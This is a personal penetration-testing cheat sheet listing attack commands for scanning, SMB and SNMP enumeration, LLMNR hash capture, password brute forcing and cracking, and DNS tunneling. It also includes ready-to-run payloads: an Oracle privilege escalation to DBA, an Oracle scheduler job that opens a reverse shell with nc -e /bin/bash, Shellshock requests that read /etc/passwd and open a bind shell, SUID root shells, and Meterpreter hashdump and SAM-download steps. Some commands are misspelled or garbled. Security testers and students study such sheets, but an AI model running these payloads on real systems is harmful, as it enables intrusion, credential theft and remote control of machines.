# < ...> where you put your variables ;)
# I try to keep it up-to-date.
# collected commands and useful simple configs around the WWW.

Network:
Set IPAddress: 
  ifconfig eth0 xxx.xxx.xxx.xxx/xx
Subnetting: 
  ipcalc xxx.xxx.xxx.xxx/24

OSINT:
Passive Information Gathering:
  whois <domain-name-here>

Perform DNS IP lookup:
  dig <a domain-name-here> @nameserver

Perform MX Record lookup:
  dig <mx domain-name-here> @nameserver

Perform Zone Transfer with DIG:
  dig <axfr domain-name-here> @nameserver

DNS Zone Transfers:
  nslookup > set type=any -> ls -d <blah.com>
  dig axfrblah.com @ns1.blah.com

Simply Email can verify the discovered email addresses after gathering:
  git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -all -e TRAGET-DOMAIN

Semi Active Information Gathering:
Basic Finger Printing:
  nc -v xxx.xxx.xxx.xxx port
  telnet xxx.xxx.xxx.xxx port

Banner Grapping with NC:
  nc TARGET-IP 80 
  GET / HTTP/1.1
  Host: TARGET-IP
  User-Agent: Mozilla/5.0
  Referrer: <A-domain >
<enter>

Active Information Gathering:
DNS Bruteforce:
DNSRecon:
  dnsrecon -d <TARGET> -D /usr/share/wordlists/dnsmap.txt -t std --xml output.xml --lifetime 30

NMAP:
  nmap -v -sS -A T4 <target>
  nmap -v -sS -p-1024 -T4 <target>
  nmap -c -sU -sS -p-1024 -T4 <target>
  nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 <target>
  ls /usr/share/nmap/scripts/* | grep ftp /*search nmap scripts
  nmap -sU <target>

UDP Protocol Scanner:
  git clone https://github.com/portcullislabs/udp-proto-scanner.git
  ./udp-proto-scanner.pl -f ipadresses.txt
  ./udp-proto-scanner.pl -p ntp -f ipadresses.txt

Other Host Discovery:
  netdiscovery -r xxx.xxx.xxx.xxx/24 

Enumeration & Attacking Network Services:
SAMB / SMB / Windows Domain Enumeration:
SMB Enumeration:
  nslookup -A target
  smbclient //MOUNT/share -I <target> -N
  rpcclient -U "" <target>
  enum4linux <target>
  nbtscan <target>/24
  enum4linux -a <target>

Figerprint  SMB Version:
  smbclient -L //<target>

Find open SMB Shares:
  nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username, smbpass=pasword -p445 <target>/24

Enumerate SMB Users:
  nmap -sU -sS --script=smb-enum-users -p U:137,T:139 <target range> 
  python /usr/share/doc/python-impacket-doc/examples/samrdump.py <target>

RID Cycling:
  ridenum.py 192.168.xxx.xxx 500 50000 dict.txt

Metasploit module for RID cycling:
  use auxiliary/scanner/smb/smb_lookupsid

Manual Null session testing:
  net use \\<TARGET>\IPC$ "" /u:
  smbclient -L //<target>

NBTScan unixwiz:
  apt-get install nbtscan-uniwiz
  nbtscan-uniwiz -f <target range> > nbtscan

LLMNR/NBT-NS Spoofing:
Metasploit LLMNR/NetBIOS requests:
spoof/poison LLMNR/NetBIOS requests:
  auxiliary/spoof/llmnr/llmnr_reponse
  auxiliary/spoof/nbns/nbns_reponse

Capture the hashes:
  auxiliary/server/capture/smb
  auxiliary/server/capture/http_ntlm
    --> use jhon or hashcat to crack it.

Responder.py:
  git clone https://github.com/SpiderLabs/Responder.git python Reponder.py -i local-ip I eth0

SNMP Enumeration:
Fix SNMP output values:
  apt-get install snmp-mibs-downloader download-mibs
  echo "" > /etc/snmp/snmp.conf

SNMP enumeration:
  snmpcheck -t 192.168.1.X -c public
  snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName|cut -d* * -f
  snmpenum -t 192.168.1.X
  onesixtyone -c names -i hosts

SNMPv3 Enumeration:
  nmap -sV -p 161 --script=snmp-info <TARGET-SUBNET>
  wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
  /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt

RSH Enumeration:
  rsh <target> <command>

Metasploit RSH Login Scanner:
  auxiliary/scanner/rservices/rsh_login
  rusers Show Logged in Users:
  rusers -al 192.168.2.1
rusers scan whole Subnet:
  rlogin -l <user> <target>

Finger Enumeration:
  finger @<TARGET-IP>

Finger a Specific Username:
  finger <pacman@TARGET-IP>

Solaris bug that shows all logged in users:
  finger 0@host

SunOS: RPC services allow user enum:
  $rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost

rwho:
  use nmap to identify machines running rwho (513 UDP)

TLS&SSL Testing:
testssl.sh:
  ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html

Vulnerability Assessment:
  Install OpenVAS on Kali
  apt-get update
  apt-get dist-upgrade -y
  apt-get install openvas
  openvas-setup

netstat -tulpn //login at https://127.0.0.1:9392 

Database Penetration Testing:
Oracle:
Install oscanner:
  apt-get install oscanner
Run oscanner:
  oscanner -s 192.168.1.200 -P 1521
Fingerprint Oracle TNS Version:
Install tnscmd10g:
  apt-get install tnscmd10g
Fingerprint oracl tns:
  tnscmd10g version -h <TARGET>
  nmap --script=oracle-tns-version
Brute force oracle user accounts:
IDentify default Oracle accounts:
  nmap --script=oracle-sid-brute
  nmap --script=oracle-brute
Run nmap script against ORACLE TNS:
  nmap -p 1521 -A <TARGET>
Oracle Privilege Escalation:
Requirements:
  1. Oracle needs to be exposed on the network.
  2. A default account is in use like scott
  3. Quick overview of how this works.
    - Create the function
    - Create an index on table SYS.DUAL
    - The index we just created executes our function SCOTT.DBA_X
    - The function will be executed by SYS user 
    - Create an account with DBA privileges.

Identify defualt accounts within oracle db using NMAP NSE script:
  namp --script=oracle-sid-brute
  namp --script=oracle-brute

Login using the identified weak account (assuming you find one)
How to identify the current privilege level for an oracle user:
  SQL> select * from session_privs;
  SQL> CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; 
  begin 
  execute immediate 'grant dba to user1 identified by pass1';
  commit;
  return 'FOO';
  end;

Oracle priv esc and obtain DBA access:
Run netcat: netcat -nvlp 443 <code>
  SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
Run the exploit with a select query:
  SQL> Select * from session_privs;
  You should have a DBA user with creds user1 and pass1
  Verify you haave DBA privileges by re-running the first command again.
  drop index exploit_1337;

Get Oracle Reverse os-shell:
  begin
  dbms_scheduler.create_job( job_name    => 'MEH1337',job_type    =>
      'EXECUTABLE',job_action => '/bin/nc',number_of_arguments => 4,start_date =>
      SYSTIMESTAMP,enabled    => FALSE,auto_drop => TRUE); 
  dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
  dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
  dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
  dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
  dbms_scheduler.enable('rev_shell'); 
  end; 

MSSQL:
Nmap:
  nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
Metasploit:
  msf>use auxiliary/scanner/mssql/mssql_ping

Bruteforce MSSQL Login:
  msf> use auxiliary/admin/mssql/mssql_enum
Metasploit MSSQL Shell:
  msf>use exploit/windows/mssql/mssql_payload
  msf exploit(mssql_payload)>set PAYLOAD windows/meterpreter/reverse_tcp

Network:
Plink.exe Tunnel:
Putty Link tunnel:
Forward remote port to local address:
  plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE_IP

Pivoting:
SSH Pivoting:
  ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
  Add socks4 127.0.0.1 1010 in /etc/proxychains.conf
SSH pivoting from from one network to another:
  ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
  Add socks4 127.0.0.1 1010 in /etc/proxychains.conf
  proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
  Add socks4 127.0.0.1 1011 in /etc/proxychains.conf

TTL Fingerprinting:
TTL Finger Printing:
  Windows 128
  Linux 64
  Solaris 255
  Cisco/Network 255

VLAN Hopping:
Using NCCGroups VLAN wrapper script for Yersina simplifies the process
  git clone https://githb.com/nccgroup/vlan-hopping.git
  chmod 700 frogger.sh
  ./frogger.sh

VPN Hacking:
Identify VPN servers:
  ./udp-protocol-scanner.pl -p ike TARGET(s)
Scan a range for VPN servers:
  ./upd-protocol-scanner.pl -p ike -f ip.txt

iKEForce:
Use IKEForce to enumerate or dictionary attack VPN servers
Install:
  pip install pyip
  git clone https://github.com/SpiderLabs/ikeforce.git
Perform IKE VPN enumeration with IKEForce:
  ./ikeforce.py TARGET-IP -e -w wordlists/groupnames.dic
Bruteforce IKE VPN using IKEForce:
  ./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w password.txt -s 1

ike-scan
ike-scan <TARGET-IP>
ike-scan -A <TARGET-IP>
ike-scan -A <TARGET-IP> --id=myid -P TARGET-IP-key

IKE Aggressive Mode PSK Cracking:
1. IDentify VPN Servers
  ./udp-protocol-scanner.pl -p ike SUBNET/24
2. Enumerate with IKEForce to obtain the group ID
  ./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic
3. Use ike-scan to capture the PSK hash from the IKE endpoint
  ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP
4. Use psk-crack to crak the hash
  psk-crack hash-file.txt

Some more advanced psk-crack options:
  pskcrack
  psk-crack -b 5 TARGET-IPkey
  psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key
  psk-crack -d /path/to/dictionary-file TARGET-IP-key

PPTP Hacking:
IDentify PPTP, Listens on TCP:1723
Nmap PPTP Fingerprinting:
  nmap -Pn -sV -p 1723 TARGER(s)
PPTP Dictionary Attack:
  thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst

DNS Tunneling:
Tunneling data over DNS to bypass firewalls.
dnscat2 supports "download" and "upload" commands for getting files to and from the target machine
Attacking machine:
Installation:
  apt-get update
  apt-get -y install ruby-dev git make g++
  gem install bundler
  git clone https://github.com/iagox86/dnscat2.git
  cd dnscat2/server
  bundle install

Run dnscat2:
  ruby ./dnscat2.rb
  dnscat2> New session established: 1422
  dnscat2> session -i 1422

Target Machine:
  https://downloads.skullsecurity.org/dnscat2/ 
  https://github.com/lukebaggett/dnscat2-powershell/

dnscat --host <dnscat server_ip>

BOF / Exploit:
Exploit Research:
Find exploits for enumerated hosts/services:
  searchsploit windows 2012 | grep -i local 
  Search exploit-db for exploit, in this example windows 2003 + local esc
  site:exploit-db.com exploit kernel <= 3
- Use google to search exploit-db.com for exploits
  grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*

Searching for Exploits:
Install local of exploit-db
searchsploit -u 
Update exploit-db
 searchsploit apache 2.2
 searchsploit "Linux Kernel"
 searchsploit linux 2.6 | grep -i ubuntu | grep local

Compiling Windows Exploits on Kali:
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
  wine mingw-get-setup.exe
  select mingw32-base
  cd /root/.wine/drive_c/windows
  wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
  cd /root/.wine/drive_c/MinGW/bin
  wine gcc -o ability.exe /tmp/exploit.c -lwsock32
  wine ability.exe 

Cross Compiling Exploits:
  gcc -m32 -o output32 hello.c
  gcc -m64 -o output hello.c

Exploiting Common Vulnerabilities:
Exploiting Shellshock:
A tool to find and exploit servers vulnerable to Shellshock:
  git clone https://github.com/nccgroup/shocker
  ./shocker.py -H <TARGET>  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
cat file (view file contents):
  echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
Shell Shock run bind shell:
  echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
Shell Shock reverse Shell:
  nc -l -p 443

Simple Local Web Servers:
  python -m SimpleHTTPServer 80
  python3 -m http.server
  ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
  php -S 0.0.0.0:80

Mounting File Shares:
How to mount NFS/CIFS, Windows and Linux file shares:
  mount 192.168.1.1:/vol/share /mnt/nfs --> Mount NFS share to /mnt/nfs
  mount -t cifs -o username=user, password=pass, domain=blah //192.168.1.X/share-name /mnt/cifs
Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)
  net use Z: \\win-server\share password /user:domain\janedoe /savecred /p:no
  apt-get install smb4k -y --> Install smb4k on Kali, useful Linux GUI for browsing SMB shares.

HTTP/HTTPS Webserver Enumeration:
  nikto -h 192.168.1.1 
  dirbuster 

Packet Inspection:
  tcpdump tcp port 80 -w output.pcap -i eth0

Username Enumeration:
SMB User Enumeration:
  python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
  ridenum.py 192.168.XXX.XXX 500 50000 dict.txt

SNMP User Enumeration:
  snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 |cut -d” “ -f4
  python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX
  nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)

Passwords:
Wordlists: /usr/share/wordlists/
Brute Force Services:
Hydra FTP Brute Force:
  hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.xxx.xxx ftp -v
Hydra Pop3 Brute Force:
  hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.xxx.xxx pop3 -v
Hydra SMTP Brute Force:
  hydra -P /usr/share/wordlistnmap.lst 192.168.xxx.xxx smtp -v

Password Cracking:
JTR:
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes
  john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt
  john --format=descrypt hash --show

Windows Penetration Testing Commands:
Compiling Exploits:
  process.h, string.h, winbase.h, windows.h, winsock2.h --> Windows
  arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, sys/sockt.h, sys/types.h, unistd.h --> Linux
Build Exploit GCC:
  gcc -o exploit exploit.c
  gcc -m32 exploit.c -o exploit
- i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe --> compile exe on Linux

SUID Binary:
SUID C Shell for /bin/bash:
int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
} 

SUID C Shell for /bin/sh:
int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}

gcc -m32 -o suid suid.c

TTY Shells:
Python TTY Shell Trick:
  python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
Spawn /interactive sh Shell:
  /bin/sh -i
Spawn Perl TTY Shell:
  exec "/bin/sh";
  perl —e 'exec "/bin/sh";'
Spawn Ruby TTY Shell:
  exec "/bin/sh"
Spawn Lua TTY Shell:
  os.execute('/bin/sh')
Spawn TTY Shell from vi:
  :!bash
Spawn TTY Shell NMAP:
  !sh

# Metasploit
Meterpreter Payloads:
  set payload windows/meterpreter/reverse_tcp

Windows VNC Meterpreter payload:
  set payload windows/vncinject/reverse_tcp
  set ViewOnly false

Linux Reverse Meterpreter payload:
  set payload linux/meterpreter/reverse_tcp

Meterpreter Cheat Sheet:
upload file c:\\windows
download c:\\windows\\repair\\sam /tmp
execute -f c:\\windows\temp\exploit.exe
execute -f cmd -c 
ps
shell
getsystem
hashdump
portfwd add –l 3389 –p 3389 –r target
portfwd delete –l 3389 –p 3389 –r target

Common Metasploit Modules:
use exploit/windows/smb/ms08_067_netapi
use exploit/windows/dcerpc/ms06_040_netapi
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

Local Windows Metasploit Modules:
use exploit/windows/local/bypassuac

Auxilary Metasploit Modules:
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login

Metasploit Powershell Modules:
use exploit/multi/script/web_delivery
post/windows/manage/powershell/exec_powershell
use exploit/multi/http/jboss_maindeployer
use exploit/windows/mssql/mssql_payload

Post Exploit Windows Metasploit Modules:
run post/windows/gather/win_privs
use post/windows/gather/credentials/gpp
load mimikatz -> wdigest
run post/windows/gather/local_admin_search_enum
run post/windows/gather/smart_hashdump
